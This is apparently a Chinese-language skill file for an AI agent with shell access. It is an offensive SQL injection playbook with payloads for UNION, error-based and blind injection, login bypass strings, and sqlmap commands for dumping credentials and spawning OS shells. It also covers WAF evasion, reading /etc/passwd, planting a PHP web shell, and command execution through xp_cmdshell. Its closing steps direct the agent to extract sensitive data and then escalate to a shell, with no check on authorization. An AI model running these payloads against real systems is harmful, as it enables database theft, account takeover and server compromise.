---
name: sqli
description: SQL 注入漏洞检测与利用。当目标存在数据库查询、搜索功能、登录表单、URL 参数时使用。包括 UNION、报错、盲注等技术。
allowed-tools: Bash, Read, Write
---

# SQL 注入 (SQL Injection)

通过在用户输入中注入 SQL 代码，操纵数据库查询，实现数据泄露、认证绕过或命令执行。

## 常见指示器

- URL 参数（id=, page=, search=, sort=, order=）
- 搜索框、登录表单
- Cookie 中的参数
- HTTP 头（User-Agent, Referer, X-Forwarded-For）
- JSON/XML 请求体中的参数
- 数字型或字符串型参数

## 检测方法

### 1. 基础测试

```bash
# 单引号测试
curl "http://target.com/page?id=1'"

# 双引号测试
curl "http://target.com/page?id=1\""

# 注释测试
curl "http://target.com/page?id=1--"
curl "http://target.com/page?id=1#"

# 逻辑测试
curl "http://target.com/page?id=1 AND 1=1"
curl "http://target.com/page?id=1 AND 1=2"
```

### 2. 时间盲注测试

```bash
# MySQL
curl "http://target.com/page?id=1 AND SLEEP(5)"

# PostgreSQL
curl "http://target.com/page?id=1; SELECT pg_sleep(5)"

# MSSQL
curl "http://target.com/page?id=1; WAITFOR DELAY '0:0:5'"
```

## 攻击向量

### UNION 注入

```sql
-- 确定列数
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- 确定显示位
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--

-- 提取数据
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,column_name,3 FROM information_schema.columns--

-- MySQL 信息收集
' UNION SELECT @@version,user(),database()--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
```

### 报错注入

```sql
-- MySQL
' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS INT)--

-- MSSQL
' AND 1=CONVERT(INT,(SELECT @@version))--
```

### 布尔盲注

```sql
-- 判断条件
' AND 1=1--  (正常)
' AND 1=2--  (异常)

-- 逐字符提取
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--

-- 二分法
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--
```

### 时间盲注

```sql
-- MySQL
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

### 堆叠查询

```sql
-- MySQL (需要 mysqli_multi_query)
'; INSERT INTO users VALUES('hacker','password')--
'; UPDATE users SET password='hacked' WHERE username='admin'--

-- MSSQL
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--

-- PostgreSQL
'; CREATE TABLE test(data text); COPY test FROM '/etc/passwd'--
```

### 认证绕过

```sql
-- 登录绕过
admin'--
admin'#
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR 1=1--
admin' OR '1'='1
' OR ''='
') OR ('1'='1
') OR ('1'='1'--

-- 密码字段绕过
' OR '1'='1
anything' OR '1'='1'--
```

## sqlmap 使用

### 基础用法

```bash
# 自动检测
sqlmap -u "http://target.com/page?id=1" --batch

# 指定参数
sqlmap -u "http://target.com/page?id=1" -p id --batch

# POST 请求
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# Cookie 注入
sqlmap -u "http://target.com/page" --cookie="id=1" -p id --batch
```

### 数据提取

```bash
# 列出数据库
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# 列出表
sqlmap -u "http://target.com/page?id=1" -D database_name --tables --batch

# 列出列
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --columns --batch

# 导出数据
sqlmap -u "http://target.com/page?id=1" -D database_name -T users -C username,password --dump --batch
```

### 高级选项

```bash
# 指定数据库类型
sqlmap -u "http://target.com/page?id=1" --dbms=mysql --batch

# 指定注入技术
# B: Boolean-based blind
# E: Error-based
# U: Union query-based
# S: Stacked queries
# T: Time-based blind
sqlmap -u "http://target.com/page?id=1" --technique=BEUST --batch

# 绕过 WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between --batch

# 提权
sqlmap -u "http://target.com/page?id=1" --os-shell --batch
sqlmap -u "http://target.com/page?id=1" --sql-shell --batch
```

## 绕过技术

### 空格绕过

```sql
-- 注释替代
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  -- Tab
SELECT%0ausername%0aFROM%0ausers  -- 换行

-- 括号
SELECT(username)FROM(users)
```

### 引号绕过

```sql
-- 十六进制
SELECT * FROM users WHERE username=0x61646d696e  -- 'admin'

-- CHAR 函数
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)
```

### 关键字绕过

```sql
-- 大小写混合
SeLeCt, UnIoN, FrOm

-- 双写
SELSELECTECT, UNUNIONION

-- 编码
%53%45%4c%45%43%54  -- SELECT

-- 注释分割
SEL/**/ECT, UN/**/ION
```

### WAF 绕过 Tamper 脚本

```bash
# 常用 tamper
--tamper=space2comment      # 空格转注释
--tamper=between            # 使用 BETWEEN 替代 >
--tamper=randomcase         # 随机大小写
--tamper=charencode         # URL 编码
--tamper=equaltolike        # = 转 LIKE
--tamper=space2plus         # 空格转 +
--tamper=space2randomblank  # 空格转随机空白字符
```

## 数据库特定语法

### MySQL

```sql
-- 版本
SELECT @@version
SELECT version()

-- 当前用户
SELECT user()
SELECT current_user()

-- 当前数据库
SELECT database()

-- 所有数据库
SELECT schema_name FROM information_schema.schemata

-- 所有表
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- 所有列
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- 读文件
SELECT LOAD_FILE('/etc/passwd')

-- 写文件
SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'
```

### PostgreSQL

```sql
-- 版本
SELECT version()

-- 当前用户
SELECT current_user

-- 当前数据库
SELECT current_database()

-- 所有数据库
SELECT datname FROM pg_database

-- 所有表
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- 读文件
CREATE TABLE test(data text); COPY test FROM '/etc/passwd'; SELECT * FROM test;

-- 命令执行
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('id');
```

### MSSQL

```sql
-- 版本
SELECT @@version

-- 当前用户
SELECT user_name()
SELECT system_user

-- 当前数据库
SELECT db_name()

-- 所有数据库
SELECT name FROM master..sysdatabases

-- 所有表
SELECT name FROM sysobjects WHERE xtype='U'

-- 命令执行
EXEC xp_cmdshell 'whoami'
```

## 最佳实践

1. 先用单引号测试是否存在注入点
2. 确定数据库类型（通过报错信息或特定函数）
3. 确定注入类型（UNION、报错、盲注）
4. 使用 sqlmap 自动化利用
5. 如果 sqlmap 失败，手工构造 payload
6. 注意 WAF 绕过，使用 tamper 脚本
7. 提取敏感数据后尝试提权（os-shell）
